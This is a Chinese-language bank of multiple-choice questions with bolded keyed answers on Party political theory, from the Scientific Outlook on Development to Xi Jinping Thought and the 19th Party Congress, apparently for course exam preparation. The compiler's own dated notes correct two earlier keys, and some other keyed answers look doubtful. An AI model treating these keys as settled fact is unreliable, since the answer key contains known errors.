<p>面对新形势和新任务的考验，以江泽民为核心的中央领导集体注重加强思想政治工作，先后采取了哪些有力措施（）。<br><strong>坚持用邓小平理论武装全党、教育干部和人民</strong><br><strong>加强党风和廉政建设，密切党同人民群众的联系</strong><br><strong>广泛开展群众性精神文明创建活动，集中宣传一大批体现时代精神的先进典型，努力丰富人们的精神文化生活</strong><br><strong>坚持正确的舆论导向，深入进行爱国主义、集体主义、社会主义和艰苦创业精神的教育</strong></p>
<p>党的（）大明确提出，要把党建设成为用邓小平理论武装起来、全心全意为人民服务、思想上政治上组织上完全巩固、能够经受住各种风险、始终走在时代前列的马克思主义政党。<br>十六<br>十三<br><strong>十五</strong><br>十四</p>
<p>“三个代表”要求，是我们党不断推进（），不断夺取建设有中国特色社会主义事业新胜利的根本要求。<br><strong>制度创新</strong><br><strong>科技创新</strong><br>技术创新<br><strong>理论创新</strong></p>
<p>（）是发展先进文化的重要内容和中心环节。<br>加强社会主义精神文明建设<br><strong>加强社会主义思想道德建设</strong><br>加强社会主义物质文明建设<br>加强社会主义道德文明建设</p>
<p>（）的宗旨，是我们党的最大政治优势,是我们党同一切剥削阶级政党的根本区别。<br>坚持走群总路线<br>从严治党<br>把人民的利益放在第一位<br><strong>全心全意为人民服务</strong></p>
<p>“三个代表”重要思想是党必须长期坚持的指导思想。贯彻“三个代表”重要思想，关键在（）。<br>坚持党的先进性<br>坚持执政为民<br>坚持党的纯洁性<br><strong>坚持与时俱进</strong></p>
<p>十六大报告的灵魂和贯穿报告全篇的一条主线是（）。<br>在坚持走中国特色社会主义道路的过程中要不断创新<br><strong>“三个代表”重要思想</strong><br>与时俱进<br>全面建设小康社会</p>
<p>“三个代表”这一科学理论在建设中国特色社会主义的思想路线、发展道路、发展阶段和发展战略、根本任务、发展动力、依靠力量、国际战略、领导力量和根本目的等重大问题上取得了丰硕成果，用一系列紧密联系、相互贯通的新思想、新观点、新论断，进一步回答了什么是社会主义，怎样建设社会主义，创造性地回答了（）。<br>怎样解放思想、实事求是、与时俱进<br>中国特色社会主义的前进方向和发展道路<br><strong>建设一个什么样的党，怎样建设党</strong><br>什么是初级阶段的社会主义，怎样建设初级阶段的社会主义</p>
<p>在逐步实现全国人民共同富裕的过程中，党员干部必须正确处理好（）。<br>如何坚持一切为了群众，一切依靠群众观点的问题<br>如何将手中的权利行使好的问题<br>领导与群众的关系<br><strong>先富与后富、个人富裕与共同富裕的关系</strong></p>
<p>社会主义现代化必须建立在（）的基础之上。<br><strong>发达生产力</strong><br>先进的科学技术<br>紧密的生产关系<br>改革与创新</p>
<p>进入新世纪的中国共产党亟待解决的两大历史性课题是（）。<br><strong>提高党的执政水平和领导水平</strong><br>增强党性和党的动员能力<br><strong>增强拒腐防变和抵御风险能力</strong><br>提高应对突发事件能力</p>
<p><em>2020.4.29更新：上题整理时出现遗漏，应包括第一项。</em></p>
<p>把“三个代表”重要思想确立为党必须长期坚持的指导思想，这是因为（）。<br>“三个代表”重要思想是全党智慧的结晶<br>“三个代表”重要思想是我党必须长期坚持的领导思想<br>“三个代表”重要思想是我党通过长期的实践提出来的<br><strong>“三个代表”重要思想是新世纪新阶段开创中国特色社会主义事业新局面的科学理论</strong></p>
<p>（）是最活跃最革命的因素，是社会发展的最终决定力量。<br>以人为本<br><strong>生产力</strong><br>生产关系<br>生活水平</p>
<p>推动全党更好地带领人民群众把中国特色社会主义事业向前推进是兴起学习贯彻“三个代表”重要思想新高潮的（）。<br>根本原因<br>根本动力<br>根本要求<br><strong>根本目的</strong></p>
<p>江泽民同志在十六大报告中，提出贯彻“三个代表”重要思想的根本要求，核心在（）。<br>坚持执政为民<br>坚持发展先进生产力<br><strong>坚持党的先进性</strong><br>坚持与时俱进</p>
<p>“三个代表”重要思想内容是（）。<br><strong>中国共产党始终代表中国最广大人民的根本利益</strong><br><strong>中国共产党始终代表中国先进生产力的发展要求</strong><br>中国共产党始终代表中国劳动人民的根本利益<br><strong>中国共产党始终代表中国先进文化的前进方向</strong></p>
<p>从1998年11月开始，全党在县级以上党政领导班子、领导干部中集中时间，分期分批开展以（）为主要内容的党性党风教育。<br>讲文明<br><strong>讲学习</strong><br><strong>讲政治</strong><br><strong>讲正气</strong></p>
<p>“三个代表”重要思想是毛泽东思想、邓小平理论一脉相承的理论体系，<br>这是因为它们（）。<br>都具有与时俱进的指导思想<br><strong>都以实现社会主义为目标，以解决中华民族的复兴为主题</strong><br><strong>有着共同的逻辑起点、共同的科学精神和共同的价值取向</strong><br><strong>都是以马克思列宁主义为理论基础和思想来源</strong></p>
<h1 id="十二-科学发展观与和谐社会建设"><a href="#十二-科学发展观与和谐社会建设" class="headerlink" title="十二  科学发展观与和谐社会建设"></a>十二  科学发展观与和谐社会建设</h1><p>全面协调可持续中的全面，是指发展要有（）。<br>整体性、一致性<br>全面性、系统性<br><strong>全面性、整体性</strong><br>系统性、一致性</p>
<p>构建和谐社会需要全新的理念和机制，但最核心的就是（）。<br>和平与发展<br>解决三农问题 　<br>科学发展<br><strong>以人为本</strong></p>
<p>2004年2月23日，中共中央政治局召开会议指出，要紧紧抓住发展这个第一要务，坚持全面、协调、可持续的科学发展观，着力解决（）。<br>宏观调控中存在的问题<br><strong>经济社会发展中的突出矛盾</strong><br>市场经济秩序中的诚信问题<br><strong>关系人民群众切身利益的突出问题</strong></p>
<p>十六届四中全会《决定》指出，社会和谐是（）。<br><strong>中国特色社会主义的本质属性</strong><br><strong>我们党不懈奋斗的目标</strong><br>共产主义社会的必然要求<br><strong>国家富强、民族振兴、人民幸福的重要保证</strong></p>
<p>胡锦涛总书记深刻指出，深入学习实践科学发展观（）。<br><strong>是落实实现全面建设小康社会奋斗目标新要求的迫切需要</strong><br>是发展中国特色社会主义理论体系的迫切需要<br><strong>是以改革创新精神全面推进党的建设新的伟大工程的迫切需要</strong><br><strong>是在深刻变化的国际环境中推动我国发展的迫切需要</strong></p>
<p>十六届四中全会《决定》指出，构建社会主义和谐社会的重点是（）。<br>走共同富裕道路<br>推动社会建设与经济建设、政治建设、文化建设协调发展<br>发展社会事业、促进社会公平正义、建设和谐文化<br><strong>解决人民群众最关心、最直接、最现实的利益问题</strong></p>
<p>十六届四中全会《决定》指出，构建社会主义和谐社会，要遵循以下原则（）。<br><strong>必须坚持正确处理改革发展稳定的关系</strong><br><strong>必须坚持以人为本;必须坚持科学发展</strong><br><strong>必须坚持改革开放;必须坚持民主法治</strong><br><strong>必须坚持在党的领导下全社会共同建设</strong></p>
<p>又好又快发展就是要保障发展的（），坚持以人为本，使发展成果由广大人民共享，防止收入分配差距过大，出现两极分化。<br>均衡性<br><strong>普惠性</strong><br>效益性<br>协调性</p>
<p>通过学习实践活动，进一步加深对科学发展观的认识，说法正确的是（）。<br><strong>要准确把握科学发展观的要义，正确回答为什么发展</strong><br><strong>要全面认识科学发展观的基本要求，正确回答什么是发展</strong><br><strong>要深刻理解科学发展观的核心，正确回答为谁发展</strong><br><strong>要自觉掌握科学发展观的根本方法，正确回答怎样发展</strong></p>
<p>开展深入学习实践科学发展观活动要围绕一个总要求就是（）。<br>构建社会主义和谐社会<br>坚持党的基本路线<br>贯彻落实科学发展观<br><strong>党员干部受教育、科学发展上水平、人民群众得实惠</strong></p>
<p>十六届四中全会《决定》指出，社会和谐的基本条件是（）。<br>建设和谐文化<br>充满活力、团结和睦<br><strong>社会公平正义</strong><br>加强社会管理、维护社会稳定</p>
<p>应当怎样认识生产发展、生活富裕、生态良好之间的辨证关系？（）。<br>由于我国经济增长的资源代价过大，国家应当把主要精力从发展生产转移到提高人民生活水平和保护生态环境上来<br>生活富裕是基础，生产发展和生态良好是目的<br><strong>生产发展是社会发展的物质基础，生活富裕是生产发展的结果，生态良好决定着生产发展和人民生活的可持续程度</strong><br>生态良好是基础，只有生态良好了，才可能有生产发展和生活富裕</p>
<p>中国要全力构建的社会主义和谐社会，必须以（）为指导。<br><strong>邓小平理论和三个代表的重要思想</strong><br>初级阶段的理论<br>宪法<br>党的基本路线</p>
<p>党的十七大报告指出：科学发展观是发展中国特色社会主义必须坚持和贯彻的（）。<br>必然要求<br>重大指导方针<br><strong>重大战略思想</strong><br>行动指南</p>
<p>统筹兼顾指（）。<br><strong>统筹人与自然和谐发展</strong><br><strong>统筹城乡发展</strong><br><strong>统筹区域发展</strong><br><strong>统筹经济社会发展</strong></p>
<p>党的十七大报告指出：要坚持人民是历史创造者的历史唯物主义观点，多为群众办好事、办实事，做到（）。<br>权为民所享、心为民所系、利为民所谋<br>权为民所享、情为民所系、利为民所谋<br><strong>权为民所用、情为民所系、利为民所谋</strong><br>权为民所用、心为民所系、利为民所享</p>
<p>统筹兼顾的基本内涵是（）。<br>既坚持经济建设为中心，又坚持改革开放和四项基本原则<br>既要发展，又要解决人民的利益问题<br><strong>既要总揽全局、统筹规划，又要抓住牵动全局的主要工作、事关群众利益的突出问题， 着力推进、重点突破</strong><br>既坚持建设高度发达的物质文明，又要建设高度发达的精神文明</p>
<p><em>2020.4.29更新：上题由多选改为单选，去掉了一、二和四选项。</em></p>
<p>和谐社会的基本特征有（）。<br><strong>公平正义</strong><br><strong>诚信友爱</strong><br><strong>民主法治</strong><br><strong>充满活力</strong></p>
<p>十六届四中全会《决定》指出，构建社会主义和谐社会（）。<br><strong>反映了建设富强民主文明和谐的社会主义现代化国家的内在要求</strong><br>是马克思列宁主义、毛泽东思想必然要求<br><strong>是我们党提出的重大战略任务</strong><br><strong>体现了全党全国各族人民的共同愿望</strong></p>
<p>十六届四中全会《决定》强调，社会和谐（）。<br><strong>在很大程度上取决于社会生产力的发展水平</strong><br><strong>在很大程度上取决于发展的协调性</strong><br><strong>必须坚持用发展的办法解决前进中的问题,大力发展社会生产力,不断为社会和谐创造雄厚的物质基础</strong><br><strong>要更加注重解决发展不平衡问题,更加注重发展社会事业,推动经济社会协调发展</strong></p>
<h1 id="十三-中国梦和社会主义核心价值观"><a href="#十三-中国梦和社会主义核心价值观" class="headerlink" title="十三  中国梦和社会主义核心价值观"></a>十三  中国梦和社会主义核心价值观</h1><p>两个百年奋斗目标是指，到中国共产党成立100年时全面建成小康社会，到新中国成立100年时建成（）的社会主义现代化国家，中华民族伟大复兴的梦想一定能实现。<br><strong>文明</strong><br><strong>和谐</strong><br><strong>民主</strong><br><strong>富强</strong></p>
<p>“实现中国梦必须弘扬中国精神，这就是（）。”习近平主席在十二届人大一次会议闭幕会上的这一高瞻远瞩、高度凝练的论述，为共筑中国梦提供了生生不息的动力之源和切实可行的现实路径。<br><strong>以爱国主义为核心的民族精神和以改革创新为核心的时代精神</strong><br>中国共产党的革命精神<br>以改革创新为核心的时代精神<br>以爱国主义为核心的民族精神</p>
<p>习近平总书记同各界优秀青年代表座谈时指出，( )是中国青年运动的时代主题。<br>建成富强民主文明和谐的社会主义现代化国家<br>自觉树立和践行社会主义核心价值观<br><strong>为实现中华民族伟大复兴的中国梦而奋斗</strong><br>青年兴则国家兴，青年强则国家强</p>
<p>在实现中国梦的道路上，要坚持发展是硬道理的战略思想，坚持以经济建设为中心，全面推进社会主义经济建设、政治建设、文化建设、社会建设、（），深化改革开放，推动科学发展，不断夯实实现中国梦的物质文化基础。<br>道德文明建设<br><strong>生态文明建设</strong><br>精神文明建设<br>法制建设</p>
<p>（）体现了社会主义核心价值观在价值导向上的定位，是立足社会层面提出的要求。<br>“富强、和谐、自由、敬业”<br>“爱国、敬业、诚信、友善”<br><strong>“自由、平等、公正、法治”</strong><br>“富强、民主、文明、和谐”</p>
<p>在同各界优秀青年代表座谈时，习近平给青年朋友们提出了坚定理想信念、练就过硬本领、勇于创新创造、（）和锤炼高尚品格五点希望。<br>保持昂扬斗志<br>点燃激情梦想<br><strong>矢志艰苦奋斗</strong><br>改善工作作风</p>
<p>实现中华民族伟大复兴的中国梦，必须充分调动最广大人民的（）。<br>积极性、参与性、创造性<br>积极性、参与性、实践性<br><strong>积极性、主动性、创造性</strong><br>主动性、参与性、创造性</p>
<p>社会主义核心价值体系的基本内容是由马克思主义指导思想、中国特色社会主义共同理想、以（）为核心的民族精神和以（）为核心的时代精神、社会主义荣辱观构成。<br>艰苦奋斗、改革创新<br>艰苦奋斗、与时俱进<br><strong>爱国主义、改革创新</strong><br>爱国主义、与时俱进</p>
<p>实现中华民族伟大复兴的中国梦，就是要实现国家富强、民族振兴、（），既深深体现了今天中国人的理想，也深深反映了先人们不懈追求进步的光荣传统。<br>社会和谐<br>法制健全<br><strong>人民幸福</strong><br>经济飞跃</p>
<p>培育和践行社会主义核心价值观要坚持的原则不包括（）<br><strong>坚持中国特色社会主义</strong><br>坚持以理想信念为核心<br>坚持联系实际<br>坚持以人为本</p>
<p>通过学习习近平总书记同各界优秀青年代表座谈时的讲话，我们了解到当代青年应当具备的素质和精神有（）。<br><strong>甘于奉献的思想境界</strong><br><strong>报效祖国的远大志向</strong><br><strong>自强不息的意志品格</strong><br><strong>朝气蓬勃的精神风貌</strong></p>
<p>广大青年要坚持用邓小平理论、“三个代表”重要思想、科学发展观武装头脑，把理想信念（）。<br><strong>建立在对科学理论的理性认同上</strong><br>建立在对群众需求的充分理解上<br><strong>建立在对历史规律的正确认识上</strong><br><strong>建立在对基本国情的准确把握上</strong></p>
<p>加强社会主义核心价值体系建设的重要意义，在于社会主义核心价值体系（）。<br><strong>凝聚了民族团结的力量</strong><br><strong>奠定了社会和谐的思想基础</strong><br><strong>指明了中国发展的前进方向</strong><br><strong>提供了国家发展的强大动力</strong></p>
<p>习近平总书记在同各界优秀青年代表座谈时强调，广大青年要用科学理论武装头脑，不断增强道路自信、制度自信、（）“三个自信”，增强对坚持党的领导的信念，永远紧跟党高高举起中国特色社会主义伟大旗帜。<br>道德自信<br><strong>理论自信</strong><br>民主自信<br>法制自信</p>
<p>广大青年要把正确的道德认知、自觉的道德养成、（）紧密结合起来，自觉树立和践行社会主义核心价值观，带头倡导良好社会风气。<br>客观的道德标准<br>优良的道德传统<br>先进的道德典型<br><strong>积极的道德实践</strong></p>
<p>习近平总书记同各界优秀青年代表座谈时提到，（）是民族进步的灵魂，是一个国家兴旺发达的不竭源泉，也是中华民族最深沉的民族禀赋，青年理应走在（）创造前列。<br><strong>创新 创新</strong><br>实践 实践<br>劳动 劳动<br>科技 科技</p>
<p>中国梦的第一要义，就是（）。<br>实现经济腾飞<br><strong>实现综合国力进一步增强</strong><br>实现社会和谐进一步提升<br>实现中华文明进一步演进</p>
<p>根据（），我们明确提出要实现中华民族伟大复兴的中国梦。<br>中国特色社会主义道路<br>现目前基本国情<br>中央领导讲话内容<br><strong>党的十八大精神</strong></p>
<p>习近平总书记在同社会各界优秀青年座谈时提到，广大青年要有敢为人先的锐气，勇于解放思想、与时俱进，敢于上下求索、开拓进取，树立在继承前人的基础上超越前人的雄心壮志，“以青春之我……，创建青春之国家，青春之民族”。其中这句话引用自革命家（）的名言。<br>孙中山<br><strong>李大钊</strong><br>陈独秀<br>鲁迅</p>
<p>习近平总书记在参观《复兴之路》展览时讲到，实现中华民族伟大复兴，就是中华民族近代以来最伟大的梦想。这个梦想，（）。<br>是全中国人民共同努力和智慧的结晶<br><strong>凝聚了几代中国人的夙愿</strong><br><strong>体现了中华民族和中国人民的整体利益</strong><br><strong>是每一个中华儿女的共同期盼</strong></p>
<h1 id="十四-群众路线、“四个全面”与“四个自信”"><a href="#十四-群众路线、“四个全面”与“四个自信”" class="headerlink" title="十四  群众路线、“四个全面”与“四个自信”"></a>十四  群众路线、“四个全面”与“四个自信”</h1><p>习近平主席在党的群众路线教育实践活动工作会议上强调：教育实践活动要以照镜子、正衣冠、洗洗澡、治治病为总要求，即着眼于（）。<br><strong>自我净化、自我完善</strong><br><strong>自我革新、自我提高</strong><br>自我批评、自我提高<br>自我净化、自我调整</p>
<p>党的十八大明确提出，围绕保持党的（），在全党深入开展以为民务实清廉为主要内容的党的群众路线教育实践活动。<br><strong>先进性和纯洁性</strong><br>进步性和科学性<br>先进性和革命性<br>进步性和纯洁性</p>
<p>全面从严治党的路径是增强从严治党的（）<br><strong>系统性</strong><br><strong>预见性</strong><br><strong>实效性</strong><br><strong>创造性</strong></p>
<p>“正衣冠”，主要是按照为民务实清廉的要求，严明党的纪律特别是（），敢于触及思想，正视矛盾和问题，从自己做起，从现在改起，端正行为，维护良好形象。<br>作风纪律<br><strong>政治纪律</strong><br>思想纪律<br>组织纪律</p>
<p>要开好民主生活会。各级党组织要教育党员干部坚持（）的方式。<br>“批评—团结—批评”<br>“团结—批评”<br>“批评—团结”<br><strong>“团结—批评—团结”</strong></p>
<p>“四个全面”中，实现党和国家长治久安的重要保障是（）。<br>全面从严治党<br>全面深化改革<br>全面建成小康社会<br><strong>全面依法治国</strong></p>
<p>党的十八大报告提出，围绕保持党的先进性和纯洁性，在全党深入开展以（）为主要内容的党的群众路线教育实践活动，着力解决人民群众反映强烈的突出问题，提高做好新形势下群众工作的能力。<br>经济建设<br>实事求是<br>反腐倡廉<br><strong>为民务实清廉</strong></p>
<p>面对世情、国情、党情的深刻变化，全党要积极克服精神懈怠危险、能力不足危险、（）、消极腐败危险。<br>作风不实危险<br>骄奢淫逸危险<br>组织涣散危险<br><strong>脱离群众危险</strong></p>
<p>为民，就是要坚持人民创造历史、人民是真正英雄，坚持以人为本、人民至上。党的群众路线内容是（）。<br><strong>一切为了群众，一切依靠群众，从群众中来，到群众中去，把党的正确主张变为群众的自觉行动</strong><br>坚持人民群众是历史的创造者，是历史的主人<br>坚持立党为公、执政为民<br>在人民群众的实践中实现人民群众的根本利益</p>
<p>“四个全面”中，增强中国特色社会主义生机活力、推动事业发展的强大动力是（）。<br><strong>全面深化改革</strong><br>全面依法治国<br>全面从严治党<br>全面建成小康社会</p>
<p>习近平总书记在党的群众路线教育实践活动工作会议上曾强调,（）是我们党的优良传统，是增强党组织战斗力、维护党的团结统一的有效武器。<br>求真务实<br><strong>批评和自我批评</strong><br>理论联系实际<br>密切联系群众</p>
<p>中央反复研究，决定把这次教育实践活动的主要任务聚焦到作风建设上，集中解决形式主义、官僚主义、享乐主义和（）这“四风”问题。<br>教条主义<br>主观主义<br>宗派主义<br><strong>奢靡之风</strong></p>
<p>围绕保持党的先进性和纯洁性，在全党深入开展以为民务实清廉为主要内容的党的群众路线教育实践活动是加强（）马克思主义执政党建设的重大部署，是推进中国特色社会主义伟大事业的重大举措。<br><strong>学习型</strong><br>科学型<br><strong>创新型</strong><br><strong>服务型</strong></p>
<p>开展党的群众路线教育实践活动要坚持围绕中心、服务大局，全面贯彻落实党的十八大提出的各项任务要求，把（）放在突出位置，以（）的新成效凝聚起推动经济社会发展的强大力量。<br>思想建设 思想建设<br>组织建设 组织建设<br><strong>作风建设 作风建设</strong><br>制度建设 制度建设</p>
<p>群众路线教育实践活动要在全体党员中开展，其中重点抓好（）以上领导机关、领导班子和领导干部。<br>乡科级<br>市厅级<br><strong>县处级</strong><br>省部级</p>
<p>习近平总书记在江苏调研时,首次并提出“四个全面”,全面吹响了治国理政的“集结号”,不仅让人回味无穷,而且令人热血沸腾,“四个全面”是指（）。<br><strong>全面建成小康社会、全面深化改革、全面依法治国、全面从严治党</strong><br>全面建成小康社会、全面深化改革、全面依法治国、全面反腐倡廉<br>全面建成小康社会、全面改革开放、全面依法治国、全面从严治党<br>全面实现中国梦、全面深化改革、全面依法治国、全面从严治党</p>
<p>反对享乐主义，要着重克服及时行乐思想和特权现象，教育引导党员、干部牢记“两个务必”，克己奉公，勤政廉政，保持昂扬向上、奋发有为的精神状态。其中“两个务必”是毛泽东同志在党的七届二中全会上提出的，具体内容包括（）。<br>务必使同志们继续保持戒骄戒躁的作风<br><strong>务必使同志们继续保持谦虚、谨慎、不骄、不躁的作风</strong><br>务必使同志们继续保持踏实肯干的作风<br><strong>务必使同志们继续保持艰苦奋斗的作风</strong></p>
<p>全面深化改革的总目标是（）。<br>积极创造社会财富，提高人民物质生活水平<br>提高综合国力，增强国际竞争力<br>加大改革开放的深度和广度，推进社会全面进步<br><strong>完善和发展中国特色社会主义制度，推进国家治理体系和治理能力现代化</strong></p>
<p>要落实为民务实清廉要求，其中清廉即要增强反腐倡廉和拒腐防变自觉性，严格规范权力行使，把权力关进制度的笼子，坚决反对一切消极腐败现象，做到（）。<br><strong>政府清廉</strong><br>领导清醒<br><strong>政治清明</strong><br><strong>干部清正</strong></p>
<p>照镜子，主要是以（）为镜，对照党的纪律、群众期盼、先进典型，对照改进作风要求，在宗旨意识、工作作风、廉洁自律上摆问题、找差距、明方向。<br>正面典型<br>反面典型<br>教育实践活动总要求<br><strong>党章</strong></p>
<h1 id="十五-中国共产党第十九次全国代表大会"><a href="#十五-中国共产党第十九次全国代表大会" class="headerlink" title="十五  中国共产党第十九次全国代表大会"></a>十五  中国共产党第十九次全国代表大会</h1><p>必须认识到，我国社会主要矛盾的变化，没有改变我们对我国社会主义所处历史阶段的判断，我国仍处于并将长期处于（）的基本国情没有变，我国是世界最大发展中国家的国际地位没有变。<br><strong>社会主义初级阶段</strong><br>社会主义阶段<br>社会主义中级阶段<br>社会主义高级阶段</p>
<p>从党的十八大到十九大，这五年来，我们勇于面对党面临的重大风险考验和党内存在的突出问题，以顽强意志品质正风肃纪、反腐惩恶，消除了党和国家内部存在的严重隐患，党内政治生活气象更新，党内政治生态明显好转，党的（）显著增强。<br>创新力<br><strong>凝聚力</strong><br><strong>创造力</strong><br><strong>战斗力</strong></p>
<p>中国特色社会主义进入新时代，我国社会主要矛盾已经转化为人民日益增长的（）需要和（）的发展之间的矛盾。<br>幸福生活　不平衡不充分<br><strong>美好生活　不平衡不充分</strong><br>幸福生活　不充分不平衡<br>美好生活　不充分不平衡</p>
<p>习近平新时代中国特色社会主义思想，明确中国特色社会主义最本质的特征是（）。<br>“五位一体”总体布局<br>建设中国特色社会主义法治体系<br>人民利益为根本出发点<br><strong>中国共产党领导</strong></p>
<p>（）是一个国家、一个民族发展中更基本、更深沉、更持久的力量。<br>制度自信<br>理论自信<br>道路自信<br><strong>文化自信</strong></p>
<p>增强党自我净化能力，根本靠强化（）和（）。<br>党的自我监督　舆论监督<br><strong>党的自我监督　群众监督</strong><br>党的自我监督　民主监督<br>党的自我监督　司法监督</p>
<p>从全面建成小康社会到基本实现现代化，再到全面建成（），是新时代中国特色社会主义发展的战略安排。<br><strong>社会主义现代化强国</strong><br>创新型国家<br>社会主义现代化大国<br>世界一流强国</p>
<p>中国共产党第十九次全国代表大会，是在全面建成小康社会决胜阶段、中国特色社会主义进入（）的关键时期召开的一次十分重要的大会。<br>新阶段<br>新征程<br>新时期<br><strong>新时代</strong></p>
<p>十九大报告指出，我们要坚持党的领导、人民当家作主、依法治国有机统一。其中，（）是社会主义民主政治的本质特征。<br>党的领导<br><strong>人民当家作主</strong><br>依法治国<br>政治体制改革</p>
<p>保持香港、澳门长期繁荣稳定，必须全面准确贯彻（）的方针。<br><strong>高度自治</strong><br><strong>“港人治港”</strong><br><strong>“澳人治澳”</strong><br><strong>“一国两制”</strong></p>
<p>从（）到（），是“两个一百年”奋斗目标的历史交汇期。<br>二〇三五年　本世纪中叶<br><strong>十九大　二十大</strong><br>二〇二〇年　二〇三五年<br>二十大　二十一大</p>
<p>在十九大报告中，习近平指出（）是激励全党全国各族人民奋勇前进的强大精神力量。<br>中国特色社会主义理论体系<br>中国特色社会主义制度<br>中国特色社会主义道路<br><strong>中国特色社会主义文化</strong></p>
<p>十九大报告中指出，我们要坚持总体国家安全观。必须坚持国家利益至上，以（）为宗旨。<br><strong>人民安全</strong><br>经济安全<br>政治安全<br>发展安全</p>
<p>习近平新时代中国特色社会主义思想，是（），必须长期坚持并不断发展。<br><strong>对马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观的继承和发展</strong><br><strong>马克思主义中国化最新成果</strong><br><strong>中国特色社会主义理论体系的重要组成部分</strong><br><strong>党和人民实践经验和集体智慧的结晶</strong></p>
<p>（）是两岸关系的政治基础。<br>反对“台独”<br><strong>一个中国原则</strong><br>和平统一<br>“九二共识”</p>
<p>十九大报告指出，要深化依法治国实践。全面依法治国是国家治理的一场深刻革命，必须坚持厉行法治，推进（）。<br><strong>严格执法</strong><br><strong>全民守法</strong><br><strong>科学立法</strong><br><strong>公正司法</strong></p>
<p>十九大报告指出，要坚决打赢脱贫攻坚战。让贫困人口和贫困地区同全国一道进入全面小康社会是我们党的庄严承诺。要动员全党全国全社会力量，坚持（）。<br>扶志、扶智结合<br><strong>精准扶贫</strong><br><strong>精准脱贫</strong><br>扶贫协作</p>
<p>十九大的主题是：不忘初心，（），高举中国特色社会主义伟大旗帜，决胜全面建成小康社会，夺取新时代中国特色社会主义伟大胜利，为实现中华民族伟大复兴的中国梦不懈奋斗。<br>方得始终<br><strong>牢记使命</strong><br>砥砺前行<br>继续前进</p>
<p>在十九大报告中，习近平提到“实施共建‘一带一路’倡议，发起创办亚洲基础设施投资银行，设立丝路基金，举办首届‘一带一路’国际合作高峰论坛、亚太经合组织领导人非正式会议、二十国集团领导人（）峰会、金砖国家领导人（）会晤、亚信峰会。”<br>厦门　杭州<br>北京　南京<br>南京　北京<br><strong>杭州　厦门</strong></p>
<p>发展是解决我国一切问题的基础和关键，发展必须是科学发展，必须坚定不移贯彻（）的发展理念。<br>创新、统筹、绿色、开放、共享<br>创造、统筹、生态、开放、共享<br><strong>创新、协调、绿色、开放、共享</strong><br>创造、协调、生态、开放、共享</p>
<h1 id="十六-习近平新时代中国特色社会主义思想"><a href="#十六-习近平新时代中国特色社会主义思想" class="headerlink" title="十六  习近平新时代中国特色社会主义思想"></a>十六  习近平新时代中国特色社会主义思想</h1><p>习近平新时代中国特色社会主义思想的总战略目标是（）。<br><strong>在全面建成小康社会的基础上，分两步走</strong><br>不断促进社会的全面发展<br>走符合中国国情的中国特色社会主义建设道路<br>实现社会主义现代化和中华民族伟大复兴</p>
<p>习近平新时代中国特色社会主义思想内涵十分丰富，涵盖了经济、政治、法治、科技、文化、教育、民生、民族、宗教、社会、生态文明、国家安全、国防和军队、“一国两制”和祖国统一、统一战线、外交、党的建设等各方面。其中最重要、最核心的内容就是党的十九大报告概括的（）。<br>“十四个坚持”<br>“四个伟大”<br>“四个全面”<br><strong>“八个明确”</strong></p>
<p>中国特色社会主义最本质的特征是（）。<br>以人为本<br>依法治国<br><strong>中国共产党领导</strong><br>坚定“四个自信”</p>
<p>党在新时代的强军目标是建设一支听党指挥、能打胜仗、（）的人民军队。<br>吃得了苦<br>骁勇善战<br>军容整肃<br><strong>作风优良</strong></p>
<p>党的十八大以来，以习近平同志为核心的党中央以问题为导向，以我们正在做的事情为中心，以马克思主义为指导，着眼于对实际问题的理论思考，着眼于新的实际和新的发展，提出了一系列治国理政新理念新思想新战略，开辟了21世纪马克思主义发展的新境界。比如，提出了“中国特色社会主义进入新时代”的论断，深化了对（）的认识。<br>社会主义发展阶段<br><strong>社会主义发展规律</strong><br>社会主义建设规律<br>中国特色社会主义</p>
<p>从理论归属上来说，新时代（）本身就是习近平新时代中国特色社会主义思想的重要内容。从这个角度上来说，习近平新时代中国特色社会主义思想具有了世界历史意义。<br>中国的思想理念<br><strong>中国的国际战略</strong><br><strong>中国的发展战略</strong><br><strong>中国的政策主张</strong></p>
<p>在新时代，只有把马克思主义同中国具体实际和时代特征结合起来的（），而没有别的什么思想能够解决社会主义的前途和命运问题，解决中华民族的前途和命运问题。<br><strong>习近平新时代中国特色社会主义思想</strong><br>“三个代表”重要思想<br>邓小平理论<br>毛泽东思想</p>
<p>具体来说，习近平新时代中国特色社会主义思想的世界意义并没有表现在（）层面上。<br>制度<br>经济<br>价值观<br><strong>政治</strong></p>
<p>习近平总书记在中央全面依法治国委员会第一次会议上的讲话提出，全面推进依法治国，总目标是建设中国特色社会主义法治体系，建设社会主义法治国家，坚持（）。<br><strong>依法治国</strong><br><strong>依法行政</strong><br>依法治理<br><strong>依法执政</strong></p>
<p>依法治国、依法执政、依法行政是一个有机整体，关键在于党要坚持依法执政、各级政府要坚持依法行政。要善于运用制度和法律治理国家，提高党（）、（）、（）水平。<br><strong>科学执政、民主执政、依法执政</strong><br>依宪执政、从严执政、民主执政<br>从严执政、依法执政、民主执政<br>科学执政、依宪执政、严格执政</p>
<p>习近平新时代中国特色社会主义思想以全新的视野深化了对（）的认识，开辟了马克思主义中国化的新境界。<br><strong>人类社会发展规律</strong><br><strong>共产党执政规律</strong><br>历史发展规律<br><strong>社会主义建设规律</strong></p>
<p>习近平新时代中国特色社会主义思想指出，从发展的终极目的来看，要不断促进人的全面发展，就必须坚持以（）为中心的发展思想。<br>党的领导<br>经济<br><strong>人民</strong><br>发展</p>
<p>习近平新时代中国特色社会主义思想源于实践又指导实践，为新时代坚持和发展中国特色社会主义、推进党和国家事业提供了基本遵循，为发展21世纪马克思主义、当代中国马克思主义作出的历史性贡献有（）。<br><strong>开辟了治国理政新境界</strong><br><strong>开辟了管党治党新境界</strong><br><strong>开辟了中国特色社会主义新境界</strong><br><strong>开辟了马克思主义新境界</strong></p>
<p>习近平总书记强调，中国特色社会主义是既坚持科学社会主义基本原则，又具有鲜明实践特色、理论特色、民族特色、时代特色的社会主义，是中国特色社会主义（）四位一体的社会主义，是统揽伟大斗争、伟大工程、伟大事业、伟大梦想的社会主义，是根植于中国大地、反映中国人民意愿、适应中国和时代发展进步要求的社会主义。<br><strong>道路、理论、制度、文化</strong><br>旗帜、理论、法制、文化<br>道路、思想、制度、文化<br>旗帜、思想、法制、文化</p>
<p>经过长期努力，中国特色社会主义进入了新时代。这是世情国情党情变化的（），是社会主要矛盾运动的（），也是党的十八大以来党和国家事业发生历史性变革的结果，是中国共产党人带领全国各族人民长期不懈奋斗的结果。<br>必然结果、历史趋势<br><strong>必然结果、必然结果</strong><br>历史趋势、必然结果<br>历史趋势、历史趋势</p>
